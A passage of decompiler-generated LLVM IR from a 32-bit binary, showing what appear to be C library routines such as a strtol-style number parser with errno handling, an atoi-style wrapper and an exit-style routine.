  %v0_804ea71 = phi i32 [ 0, %dec_label_pc_804ea56 ], [ %v1_804ea4c, %dec_label_pc_804ea45 ], [ %v1_804ea64, %dec_label_pc_804ea5f ]
  %v1_804ea67 = mul nuw nsw i32 %v0_804ea71, 4
  %v2_804ea67 = add i32 %v1_804ea67, ptrtoint (i32* @global_var_8054014.167 to i32)
  %v3_804ea67 = inttoptr i32 %v2_804ea67 to i32*
  %v4_804ea67 = load i32, i32* %v3_804ea67, align 4
  store i32 %v4_804ea67, i32* %eax.global-to-local, align 4
  %v1_804ea6e = add i32 %tmp7, 4
  store i32 %v1_804ea6e, i32* @esi, align 4
  %v2_804ea71 = add i32 %v1_804ea67, ptrtoint (i32* @global_var_8054000.168 to i32)
  %v3_804ea71 = inttoptr i32 %v2_804ea71 to i32*
  %v4_804ea71 = load i32, i32* %v3_804ea71, align 4
  store i32 %v4_804ea71, i32* %edx.global-to-local, align 4
  %v2_804ea78 = add i32 %arg4, 12
  %v3_804ea78 = inttoptr i32 %v2_804ea78 to i32*
  store i32 %v0_804ea71, i32* %v3_804ea78, align 4
  %v0_804ea7b = load i32, i32* @esi, align 4
  %v1_804ea7b = load i32, i32* @edi, align 4
  %v2_804ea7b = add i32 %v1_804ea7b, 8
  %v3_804ea7b = inttoptr i32 %v2_804ea7b to i32*
  store i32 %v0_804ea7b, i32* %v3_804ea7b, align 4
  %v0_804ea7e = load i32, i32* %eax.global-to-local, align 4
  %v1_804ea7e = load i32, i32* @edi, align 4
  %v2_804ea7e = add i32 %v1_804ea7e, 16
  %v3_804ea7e = inttoptr i32 %v2_804ea7e to i32*
  store i32 %v0_804ea7e, i32* %v3_804ea7e, align 4
  %v0_804ea81 = load i32, i32* @esi, align 4
  %v1_804ea81 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ea81 = mul i32 %v1_804ea81, 4
  %v3_804ea81 = add i32 %v2_804ea81, %v0_804ea81
  store i32 %v3_804ea81, i32* %eax.global-to-local, align 4
  %v0_804ea84 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ea84 = load i32, i32* @edi, align 4
  %v2_804ea84 = add i32 %v1_804ea84, 20
  %v3_804ea84 = inttoptr i32 %v2_804ea84 to i32*
  store i32 %v0_804ea84, i32* %v3_804ea84, align 4
  %v0_804ea87 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ea87 = load i32, i32* @edi, align 4
  %v2_804ea87 = add i32 %v1_804ea87, 24
  %v3_804ea87 = inttoptr i32 %v2_804ea87 to i32*
  store i32 %v0_804ea87, i32* %v3_804ea87, align 4
  %v0_804ea8a = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_804ea8f = inttoptr i32 %v0_804ea8a to i32*
  %v3_804ea8f = call i32 @function_804e993(i32 %arg1, i32* %v2_804ea8f)
  %v0_804ea94 = load i32, i32* @ebp, align 4
  %v1_804ea94 = inttoptr i32 %v0_804ea94 to i32*
  store i32 0, i32* %v1_804ea94, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804ea9f = load i32, i32* @ebx, align 4
  %v1_804ea9f = icmp eq i32 %v0_804ea9f, 0
  br i1 %v1_804ea9f, label %dec_label_pc_804ead0, label %dec_label_pc_804eaa3

dec_label_pc_804eaa3:                             ; preds = %dec_label_pc_804ea67
  %v0_804eaa3 = load i32, i32* @edi, align 4
  %v1_804eaa3 = add i32 %v0_804eaa3, 4
  %v2_804eaa3 = inttoptr i32 %v1_804eaa3 to i32*
  %v3_804eaa3 = load i32, i32* %v2_804eaa3, align 4
  %v1_804eaa6 = load i32, i32* @esi, align 4
  %v2_804eaa6 = sub i32 %v3_804eaa3, %v1_804eaa6
  %v2_804eaa8 = sdiv i32 %v2_804eaa6, 4
  %v3_804eaab = mul i32 %v2_804eaa8, 5
  %v2_804eaae = add i32 %v3_804eaab, %v0_804ea9f
  %v1_804eab0 = load i32, i32* @ebp, align 4
  %v2_804eab0 = inttoptr i32 %v1_804eab0 to i32*
  store i32 %v2_804eaae, i32* %v2_804eab0, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ead0

dec_label_pc_804eab7:                             ; preds = %dec_label_pc_804ea56
  %v1_804eab7 = call i32 @function_804b7f4(i32 %v0_804ea30)
  store i32 %v1_804eab7, i32* %eax.global-to-local, align 4
  %v1_804eabc = inttoptr i32 %v1_804eab7 to i32*
  store i32 22, i32* %v1_804eabc, align 4
  %v0_804eac2 = load i32, i32* %stack_var_-36, align 4
  %v1_804eac2 = call i32 @function_804b7f4(i32 %v0_804eac2)
  %v1_804eac7 = inttoptr i32 %v1_804eac2 to i32*
  store i32 22, i32* %v1_804eac7, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ead0

dec_label_pc_804ead0:                             ; preds = %dec_label_pc_804ea67, %dec_label_pc_804eaa3, %dec_label_pc_804eab7
  %v0_804ead7 = phi i32 [ 0, %dec_label_pc_804ea67 ], [ 0, %dec_label_pc_804eaa3 ], [ -1, %dec_label_pc_804eab7 ]
  store i32 %v0_804ea2f, i32* @esi, align 4
  ret i32 %v0_804ead7

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804ead0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ea67, { 2, 0, 1 }
}

define i32 @function_804ead8(i32 %arg1) local_unnamed_addr {
dec_label_pc_804ead8:
  %v3_804eae3 = call i32 @function_804eaec(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_804eae3
}

define i32 @function_804eaec(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804eaec:
  %v4_804eafd = inttoptr i32 %arg1 to i8*
  %v5_804eafd = call i32 @function_804eb08(i8* %v4_804eafd, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_804eafd
}

define i32 @function_804eb08(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804eb08:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804eb0b = load i32, i32* @ebx, align 4
  store i32 %v0_804eb0b, i32* %stack_var_-16, align 4
  %v4_804eb0f = ptrtoint i8* %arg1 to i32
  store i32 %v4_804eb0f, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  %v0_804eb17 = load i32, i32* @global_var_8055da0, align 32
  store i32 %v0_804eb17, i32* %edx.global-to-local, align 4
  store i32 %v4_804eb0f, i32* %ebx.global-to-local, align 4
  %v2_804eb2241 = load i8, i8* %arg1, align 1
  %v3_804eb2242 = sext i8 %v2_804eb2241 to i32
  store i32 %v3_804eb2242, i32* %eax.global-to-local, align 4
  %v2_804eb2543 = mul nsw i32 %v3_804eb2242, 2
  %v3_804eb2544 = add i32 %v2_804eb2543, %v0_804eb17
  %v4_804eb2545 = inttoptr i32 %v3_804eb2544 to i8*
  %v5_804eb2546 = load i8, i8* %v4_804eb2545, align 1
  %v6_804eb2547 = and i8 %v5_804eb2546, 32
  %v7_804eb2548 = icmp eq i8 %v6_804eb2547, 0
  %v1_804eb2949 = icmp eq i1 %v7_804eb2548, false
  br i1 %v1_804eb2949, label %dec_label_pc_804eb21, label %dec_label_pc_804eb2b

dec_label_pc_804eb21:                             ; preds = %dec_label_pc_804eb08, %dec_label_pc_804eb21
  %v0_804eb2150 = phi i32 [ %v1_804eb21, %dec_label_pc_804eb21 ], [ %v4_804eb0f, %dec_label_pc_804eb08 ]
  %v1_804eb21 = add i32 %v0_804eb2150, 1
  store i32 %v1_804eb21, i32* %ebx.global-to-local, align 4
  %v1_804eb22 = inttoptr i32 %v1_804eb21 to i8*
  %v2_804eb22 = load i8, i8* %v1_804eb22, align 1
  %v3_804eb22 = sext i8 %v2_804eb22 to i32
  store i32 %v3_804eb22, i32* %eax.global-to-local, align 4
  %v2_804eb25 = mul nsw i32 %v3_804eb22, 2
  %v3_804eb25 = add i32 %v2_804eb25, %v0_804eb17
  %v4_804eb25 = inttoptr i32 %v3_804eb25 to i8*
  %v5_804eb25 = load i8, i8* %v4_804eb25, align 1
  %v6_804eb25 = and i8 %v5_804eb25, 32
  %v7_804eb25 = icmp eq i8 %v6_804eb25, 0
  %v1_804eb29 = icmp eq i1 %v7_804eb25, false
  br i1 %v1_804eb29, label %dec_label_pc_804eb21, label %dec_label_pc_804eb2b

dec_label_pc_804eb2b:                             ; preds = %dec_label_pc_804eb21, %dec_label_pc_804eb08
  %v0_804eb21.lcssa = phi i32 [ %v4_804eb0f, %dec_label_pc_804eb08 ], [ %v1_804eb21, %dec_label_pc_804eb21 ]
  %v2_804eb22.lcssa = phi i8 [ %v2_804eb2241, %dec_label_pc_804eb08 ], [ %v2_804eb22, %dec_label_pc_804eb21 ]
  %v3_804eb22.lcssa = phi i32 [ %v3_804eb2242, %dec_label_pc_804eb08 ], [ %v3_804eb22, %dec_label_pc_804eb21 ]
  %tmp37 = trunc i32 %arg4 to i8
  %v9_804eb2b = icmp eq i8 %v2_804eb22.lcssa, 43
  br i1 %v9_804eb2b, label %dec_label_pc_804eb46, label %dec_label_pc_804eb30

dec_label_pc_804eb30:                             ; preds = %dec_label_pc_804eb2b
  %v9_804eb30 = icmp eq i8 %v2_804eb22.lcssa, 45
  %v1_804eb38 = icmp eq i1 %v9_804eb30, false
  br i1 %v1_804eb38, label %dec_label_pc_804eb47, label %dec_label_pc_804eb46

dec_label_pc_804eb46:                             ; preds = %dec_label_pc_804eb2b, %dec_label_pc_804eb30
  %storemerge5 = phi i8 [ 1, %dec_label_pc_804eb30 ], [ 0, %dec_label_pc_804eb2b ]
  %v1_804eb46 = add i32 %v0_804eb21.lcssa, 1
  store i32 %v1_804eb46, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804eb47

dec_label_pc_804eb47:                             ; preds = %dec_label_pc_804eb30, %dec_label_pc_804eb46
  %v0_804eb59 = phi i32 [ %v1_804eb46, %dec_label_pc_804eb46 ], [ %v0_804eb21.lcssa, %dec_label_pc_804eb30 ]
  %stack_var_-18.0 = phi i8 [ %storemerge5, %dec_label_pc_804eb46 ], [ 0, %dec_label_pc_804eb30 ]
  %v1_804eb47 = and i32 %arg3, -17
  %v2_804eb47 = icmp eq i32 %v1_804eb47, 0
  %v1_804eb4f = icmp eq i1 %v2_804eb47, false
  br i1 %v1_804eb4f, label %dec_label_pc_804eb75, label %dec_label_pc_804eb51

dec_label_pc_804eb51:                             ; preds = %dec_label_pc_804eb47
  %v1_804eb51 = add i32 %arg3, 10
  store i32 %v1_804eb51, i32* %esi.global-to-local, align 4
  %v1_804eb54 = inttoptr i32 %v0_804eb59 to i8*
  %v2_804eb54 = load i8, i8* %v1_804eb54, align 1
  %v8_804eb54 = icmp eq i8 %v2_804eb54, 48
  %v1_804eb57 = icmp eq i1 %v8_804eb54, false
  br i1 %v1_804eb57, label %dec_label_pc_804eb6a, label %dec_label_pc_804eb59

dec_label_pc_804eb59:                             ; preds = %dec_label_pc_804eb51
  %v1_804eb59 = add i32 %v0_804eb59, 1
  store i32 %v1_804eb59, i32* %ebx.global-to-local, align 4
  %v1_804eb5a = add i32 %arg3, 8
  store i32 %v1_804eb5a, i32* %esi.global-to-local, align 4
  %v1_804eb5d = inttoptr i32 %v1_804eb59 to i8*
  %v2_804eb5d = load i8, i8* %v1_804eb5d, align 1
  %v2_804eb61 = or i8 %v2_804eb5d, 32
  %v7_804eb61 = zext i8 %v2_804eb61 to i32
  %v9_804eb61 = and i32 %v3_804eb22.lcssa, -256
  %v10_804eb61 = or i32 %v7_804eb61, %v9_804eb61
  store i32 %v10_804eb61, i32* %eax.global-to-local, align 4
  %v10_804eb63 = icmp eq i8 %v2_804eb61, 120
  %v1_804eb65 = icmp eq i1 %v10_804eb63, false
  br i1 %v1_804eb65, label %dec_label_pc_804eb6a, label %dec_label_pc_804eb67

dec_label_pc_804eb67:                             ; preds = %dec_label_pc_804eb59
  %v2_804eb67 = mul i32 %v1_804eb5a, 2
  store i32 %v2_804eb67, i32* %esi.global-to-local, align 4
  %v1_804eb69 = add i32 %v0_804eb59, 2
  store i32 %v1_804eb69, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804eb6a

dec_label_pc_804eb6a:                             ; preds = %dec_label_pc_804eb59, %dec_label_pc_804eb51, %dec_label_pc_804eb67
  %v0_804eb9213 = phi i32 [ %v1_804eb59, %dec_label_pc_804eb59 ], [ %v0_804eb59, %dec_label_pc_804eb51 ], [ %v1_804eb69, %dec_label_pc_804eb67 ]
  %v0_804ebec22 = phi i32 [ %v1_804eb59, %dec_label_pc_804eb59 ], [ %v4_804eb0f, %dec_label_pc_804eb51 ], [ %v1_804eb59, %dec_label_pc_804eb67 ]
  %v3_804eb72 = phi i32 [ %v1_804eb5a, %dec_label_pc_804eb59 ], [ %v1_804eb51, %dec_label_pc_804eb51 ], [ %v2_804eb67, %dec_label_pc_804eb67 ]
  %v1_804eb6a = add i32 %v3_804eb72, -17
  %v6_804eb6a = sub i32 16, %v3_804eb72
  %v7_804eb6a = and i32 %v6_804eb6a, %v3_804eb72
  %v8_804eb6a = icmp slt i32 %v7_804eb6a, 0
  %v10_804eb6a = icmp slt i32 %v1_804eb6a, 0
  store i32 16, i32* %eax.global-to-local, align 4
  %v2_804eb72 = icmp eq i1 %v10_804eb6a, %v8_804eb6a
  %v5_804eb72 = select i1 %v2_804eb72, i32 16, i32 %v3_804eb72
  store i32 %v5_804eb72, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804eb75

dec_label_pc_804eb75:                             ; preds = %dec_label_pc_804eb47, %dec_label_pc_804eb6a
  %v0_804ebec23 = phi i32 [ %v4_804eb0f, %dec_label_pc_804eb47 ], [ %v0_804ebec22, %dec_label_pc_804eb6a ]
  %v0_804eb9212 = phi i32 [ %v0_804eb59, %dec_label_pc_804eb47 ], [ %v0_804eb9213, %dec_label_pc_804eb6a ]
  %v0_804eb84 = phi i32 [ %arg3, %dec_label_pc_804eb47 ], [ %v5_804eb72, %dec_label_pc_804eb6a ]
  %v1_804eb75 = add i32 %v0_804eb84, -2
  store i32 %v1_804eb75, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v6_804eb7d = icmp ugt i32 %v1_804eb75, 34
  br i1 %v6_804eb7d, label %dec_label_pc_804ebe1, label %dec_label_pc_804eb7f

dec_label_pc_804eb7f:                             ; preds = %dec_label_pc_804eb75
  %div = udiv i32 -1, %v0_804eb84
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp38 = urem i32 -1, %v0_804eb84
  %v1_804eb86 = trunc i32 %tmp38 to i8
  store i32 %div, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v4_804ebbf = urem i32 %arg4, 256
  br label %dec_label_pc_804eb92

dec_label_pc_804eb90:                             ; preds = %dec_label_pc_804ebd7, %dec_label_pc_804ebbf
  %v2_804eb94.pre = phi i32 [ %v0_804ebda, %dec_label_pc_804ebd7 ], [ %v2_804eb94.pre.pre, %dec_label_pc_804ebbf ]
  %v4_804eb92.pre = phi i32 [ %v1_804ebab, %dec_label_pc_804ebd7 ], [ %v4_804eb92.pre.pre, %dec_label_pc_804ebbf ]
  %v0_804eb90 = phi i32 [ %v1_804ebb2, %dec_label_pc_804ebd7 ], [ %v0_804eb90.pre, %dec_label_pc_804ebbf ]
  %stack_var_-18.1 = phi i8 [ %stack_var_-18.2, %dec_label_pc_804ebd7 ], [ %v6_804ebc3, %dec_label_pc_804ebbf ]
  br label %dec_label_pc_804eb92

dec_label_pc_804eb92:                             ; preds = %dec_label_pc_804eb7f, %dec_label_pc_804eb90
  %v0_804ebec21 = phi i32 [ %v0_804ebec23, %dec_label_pc_804eb7f ], [ %v0_804eb90, %dec_label_pc_804eb90 ]
  %v0_804ebb2 = phi i32 [ %v0_804eb9212, %dec_label_pc_804eb7f ], [ %v0_804eb90, %dec_label_pc_804eb90 ]
  %v2_804eb94 = phi i32 [ %v4_804eb0f, %dec_label_pc_804eb7f ], [ %v2_804eb94.pre, %dec_label_pc_804eb90 ]
  %v4_804eb92 = phi i32 [ %div, %dec_label_pc_804eb7f ], [ %v4_804eb92.pre, %dec_label_pc_804eb90 ]
  %stack_var_-18.2 = phi i8 [ %stack_var_-18.0, %dec_label_pc_804eb7f ], [ %stack_var_-18.1, %dec_label_pc_804eb90 ]
  %v1_804eb92 = inttoptr i32 %v0_804ebb2 to i8*
  %v2_804eb92 = load i8, i8* %v1_804eb92, align 1
  %v3_804eb92 = zext i8 %v2_804eb92 to i32
  %v5_804eb92 = and i32 %v4_804eb92, -256
  %v6_804eb92 = or i32 %v3_804eb92, %v5_804eb92
  store i32 %v6_804eb92, i32* %eax.global-to-local, align 4
  %v2_804eb96 = add i8 %v2_804eb92, -48
  %v12_804eb96 = zext i8 %v2_804eb96 to i32
  %v14_804eb96 = and i32 %v2_804eb94, -256
  %v15_804eb96 = or i32 %v12_804eb96, %v14_804eb96
  store i32 %v15_804eb96, i32* %ecx.global-to-local, align 4
  %tmp = icmp ult i8 %v2_804eb96, 10
  br i1 %tmp, label %dec_label_pc_804ebab, label %dec_label_pc_804eb9e

dec_label_pc_804eb9e:                             ; preds = %dec_label_pc_804eb92
  %v2_804eb9e = or i8 %v2_804eb92, 32
  %v7_804eb9e = zext i8 %v2_804eb9e to i32
  %v10_804eb9e = or i32 %v7_804eb9e, %v5_804eb92
  store i32 %v10_804eb9e, i32* %eax.global-to-local, align 4
  %v2_804eba0 = or i32 %v14_804eb96, 40
  store i32 %v2_804eba0, i32* %ecx.global-to-local, align 4
  %tmp55 = icmp ult i8 %v2_804eb9e, 97
  br i1 %tmp55, label %dec_label_pc_804ebab, label %dec_label_pc_804eba6

dec_label_pc_804eba6:                             ; preds = %dec_label_pc_804eb9e
  %v2_804eba8 = add i8 %v2_804eb9e, -87
  %v15_804eba8 = zext i8 %v2_804eba8 to i32
  %v18_804eba8 = or i32 %v15_804eba8, %v14_804eb96
  store i32 %v18_804eba8, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804ebab

dec_label_pc_804ebab:                             ; preds = %dec_label_pc_804eb9e, %dec_label_pc_804eb92, %dec_label_pc_804eba6
  %v0_804ebda = phi i32 [ %v2_804eba0, %dec_label_pc_804eb9e ], [ %v15_804eb96, %dec_label_pc_804eb92 ], [ %v18_804eba8, %dec_label_pc_804eba6 ]
  %v1_804ebab = urem i32 %v0_804ebda, 256
  store i32 %v1_804ebab, i32* %eax.global-to-local, align 4
  %v1_804ebae = load i32, i32* %esi.global-to-local, align 4
  %v2_804ebae = sub i32 %v1_804ebab, %v1_804ebae
  %v10_804ebae = and i32 %v2_804ebae, %v1_804ebae
  %v11_804ebae = icmp slt i32 %v10_804ebae, 0
  %v13_804ebae = icmp slt i32 %v2_804ebae, 0
  %v2_804ebb0 = icmp eq i1 %v13_804ebae, %v11_804ebae
  br i1 %v2_804ebb0, label %dec_label_pc_804ebe1, label %dec_label_pc_804ebb2

dec_label_pc_804ebb2:                             ; preds = %dec_label_pc_804ebab
  %v1_804ebb2 = add i32 %v0_804ebb2, 1
  store i32 %v1_804ebb2, i32* %ebx.global-to-local, align 4
  %v0_804ebb3 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ebb3 = load i32, i32* %ebp.global-to-local, align 4
  %tmp56 = icmp ugt i32 %v0_804ebb3, %v1_804ebb3
  br i1 %tmp56, label %dec_label_pc_804ebbf, label %dec_label_pc_804ebb7

dec_label_pc_804ebb7:                             ; preds = %dec_label_pc_804ebb2
  %v12_804ebb3 = icmp eq i32 %v0_804ebb3, %v1_804ebb3
  %v1_804ebb7 = icmp eq i1 %v12_804ebb3, false
  br i1 %v1_804ebb7, label %dec_label_pc_804ebd7, label %dec_label_pc_804ebb9

dec_label_pc_804ebb9:                             ; preds = %dec_label_pc_804ebb7
  %v1_804ebb9 = trunc i32 %v0_804ebda to i8
  %tmp57 = icmp ugt i8 %v1_804ebb9, %v1_804eb86
  br i1 %tmp57, label %dec_label_pc_804ebbf, label %dec_label_pc_804ebd7

dec_label_pc_804ebbf:                             ; preds = %dec_label_pc_804ebb9, %dec_label_pc_804ebb2
  store i32 %v4_804ebbf, i32* %eax.global-to-local, align 4
  %v6_804ebc3 = and i8 %stack_var_-18.2, %tmp37
  %v1_804ebc7 = sext i8 %v6_804ebc3 to i32
  %v2_804ebc7 = call i32 @function_804b7f4(i32 %v1_804ebc7)
  store i32 %v2_804ebc7, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_804ebcf = inttoptr i32 %v2_804ebc7 to i32*
  store i32 34, i32* %v1_804ebcf, align 4
  %v0_804eb90.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_804eb92.pre.pre = load i32, i32* %eax.global-to-local, align 4
  %v2_804eb94.pre.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804eb90

dec_label_pc_804ebd7:                             ; preds = %dec_label_pc_804ebb9, %dec_label_pc_804ebb7
  %v4_804ebd7 = mul i32 %v0_804ebb3, %v1_804ebae
  store i32 %v1_804ebab, i32* %eax.global-to-local, align 4
  %v2_804ebdd = add i32 %v4_804ebd7, %v1_804ebab
  store i32 %v2_804ebdd, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804eb90

dec_label_pc_804ebe1:                             ; preds = %dec_label_pc_804ebab, %dec_label_pc_804eb75
  %v0_804ebec = phi i32 [ %v0_804ebec23, %dec_label_pc_804eb75 ], [ %v0_804ebec21, %dec_label_pc_804ebab ]
  %stack_var_-18.3 = phi i8 [ %stack_var_-18.0, %dec_label_pc_804eb75 ], [ %stack_var_-18.2, %dec_label_pc_804ebab ]
  %v4_804ebe1 = icmp eq i32 %arg2, 0
  br i1 %v4_804ebe1, label %dec_label_pc_804ebee, label %dec_label_pc_804ebe8

dec_label_pc_804ebe8:                             ; preds = %dec_label_pc_804ebe1
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_804ebec = inttoptr i32 %arg2 to i32*
  store i32 %v0_804ebec, i32* %v2_804ebec, align 4
  br label %dec_label_pc_804ebee

dec_label_pc_804ebee:                             ; preds = %dec_label_pc_804ebe1, %dec_label_pc_804ebe8
  %v8_804ebee = icmp eq i8 %stack_var_-18.3, 0
  %v2_804ebf3 = zext i1 %v8_804ebee to i32
  %v13_804ebf3 = icmp eq i1 %v8_804ebee, false
  %v1_804ebf53 = or i32 %v2_804ebf3, -2147483648
  store i32 %v1_804ebf53, i32* %ebx.global-to-local, align 4
  %v5_804ebfb = icmp eq i8 %tmp37, 0
  br i1 %v5_804ebfb, label %dec_label_pc_804ec13, label %dec_label_pc_804ec02

dec_label_pc_804ec02:                             ; preds = %dec_label_pc_804ebee
  %v0_804ec02 = load i32, i32* %edx.global-to-local, align 4
  %tmp58 = icmp ugt i32 %v0_804ec02, %v1_804ebf53
  br i1 %tmp58, label %dec_label_pc_804ec06, label %dec_label_pc_804ec13

dec_label_pc_804ec06:                             ; preds = %dec_label_pc_804ec02
  %v1_804ec06 = sext i8 %stack_var_-18.3 to i32
  %v2_804ec06 = call i32 @function_804b7f4(i32 %v1_804ec06)
  store i32 %v2_804ec06, i32* %eax.global-to-local, align 4
  %v0_804ec0b = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804ec0b, i32* %edx.global-to-local, align 4
  %v1_804ec0d = inttoptr i32 %v2_804ec06 to i32*
  store i32 34, i32* %v1_804ec0d, align 4
  br label %dec_label_pc_804ec13

dec_label_pc_804ec13:                             ; preds = %dec_label_pc_804ec02, %dec_label_pc_804ebee, %dec_label_pc_804ec06
  %v0_804ec13 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ec15 = sub i32 0, %v0_804ec13
  %v4_804ec1c = select i1 %v13_804ebf3, i32 %v1_804ec15, i32 %v0_804ec13
  store i32 %v4_804ec1c, i32* %edx.global-to-local, align 4
  %v2_804ec22 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804ec22, i32* @ebx, align 4
  store i32 %v4_804ec1c, i32* %eax.global-to-local, align 4
  ret i32 %v4_804ec1c

; uselistorder directives
  uselistorder i32 %v4_804ec1c, { 1, 0, 2 }
  uselistorder i1 %v8_804ebee, { 1, 0 }
  uselistorder i8 %v6_804ebc3, { 1, 0 }
  uselistorder i32 %v1_804ebb3, { 1, 0 }
  uselistorder i32 %v0_804ebb3, { 2, 1, 0 }
  uselistorder i32 %v1_804ebb2, { 1, 0 }
  uselistorder i32 %v2_804ebae, { 1, 0 }
  uselistorder i32 %v1_804ebab, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_804ebda, { 2, 0, 1 }
  uselistorder i8 %v2_804eb9e, { 1, 0, 2 }
  uselistorder i32 %v14_804eb96, { 0, 2, 1 }
  uselistorder i32 %v0_804eb90, { 1, 0 }
  uselistorder i32 %v0_804eb84, { 1, 0, 2 }
  uselistorder i32 %v3_804eb72, { 1, 0, 3, 2 }
  uselistorder i32 %v2_804eb67, { 1, 0 }
  uselistorder i32 %v1_804eb5a, { 1, 0, 2 }
  uselistorder i8 %stack_var_-18.0, { 1, 0 }
  uselistorder i32 %v0_804eb59, { 1, 2, 0, 3, 4 }
  uselistorder i8 %tmp37, { 1, 0 }
  uselistorder i8 %v2_804eb22.lcssa, { 1, 0 }
  uselistorder i32 %v0_804eb21.lcssa, { 1, 0 }
  uselistorder i32 %v1_804eb21, { 0, 3, 2, 1 }
  uselistorder i32 %v0_804eb17, { 1, 0, 2 }
  uselistorder i32 %v4_804eb0f, { 5, 4, 3, 0, 1, 2, 6 }
  uselistorder i32* %esi.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 6, 1, 7, 2, 3, 4, 5, 8, 9 }
  uselistorder i32* %ecx.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 9, 10, 4, 5, 6, 7, 8, 11, 12, 13, 14, 15 }
  uselistorder i32 -17, { 1, 3, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ec13, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ebee, { 1, 0 }
  uselistorder label %dec_label_pc_804ebab, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804eb92, { 1, 0 }
  uselistorder label %dec_label_pc_804eb75, { 1, 0 }
  uselistorder label %dec_label_pc_804eb6a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804eb47, { 1, 0 }
  uselistorder label %dec_label_pc_804eb46, { 1, 0 }
  uselistorder label %dec_label_pc_804eb21, { 1, 0 }
}

define i32 @function_804ec2c(i32 %arg1) local_unnamed_addr {
dec_label_pc_804ec2c:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_804ec3f = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804ec3f, i32* @ebx, align 4
  %v2_804ec44 = call i32 @function_804f016(i32 %v2_804ec3f, i32 134541331)
  %v1_804ec50 = call i32 @function_804f013(i32 ptrtoint (i32* @global_var_8055d80.169 to i32))
  %v0_804ec55 = load i32, i32* @global_var_8058464.170, align 4
  store i32 %v0_804ec55, i32* @eax, align 4
  %v1_804ec5d = icmp eq i32 %v0_804ec55, 0
  br i1 %v1_804ec5d, label %dec_label_pc_804ec6a, label %dec_label_pc_804ec61

dec_label_pc_804ec61:                             ; preds = %dec_label_pc_804ec2c
  %v0_804ec64 = load i32, i32* @esi, align 4
  %v1_804ec65 = call i32 @unknown_0(i32 %v0_804ec64)
  store i32 %v1_804ec65, i32* @eax, align 4
  br label %dec_label_pc_804ec6a

dec_label_pc_804ec6a:                             ; preds = %dec_label_pc_804ec2c, %dec_label_pc_804ec61
  %v2_804ec6f = call i32 @function_804f016(i32 %v2_804ec3f, i32 1)
  %v0_804ec74 = call i32 @function_804efd4()
  %v0_804ec85 = call i32 @function_804bf86()
  %v0_804ec8d = load i32, i32* @esi, align 4
  %v1_804ec8e = call i32 @function_804f470(i32 %v0_804ec8d)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @function_804f470, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ec6a, { 1, 0 }
}

define i32 @function_804ec94(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_804ec94:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_804ec9a = load i32, i32* @ebx, align 4
  store i32 %v0_804ec9a, i32* %stack_var_-12, align 4
  %v2_804ec9b = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_804ec9b, i32* %eax.global-to-local, align 4
  %v12_804ec9e = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_804eca4

dec_label_pc_804eca4:                             ; preds = %dec_label_pc_804eca4, %dec_label_pc_804ec94
